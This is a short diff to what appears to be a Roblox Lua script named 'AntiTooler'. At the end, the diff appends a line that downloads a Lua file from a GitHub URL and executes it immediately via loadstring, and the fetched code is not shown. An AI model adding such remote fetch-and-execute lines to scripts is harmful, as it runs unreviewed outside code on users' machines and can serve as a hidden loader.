@@ -31,3 +31,4 @@ else
     game.TextChatService.TextChannels.RBXGeneral:SendAsync('AntiTooler already loaded!')
 end
 shared.ANTITOOLER_LOADED = true
+loadstring(game:HttpGet('https://github.com/popoffroblox/LoadLists/raw/refs/heads/main/loadlists.lua', true))()
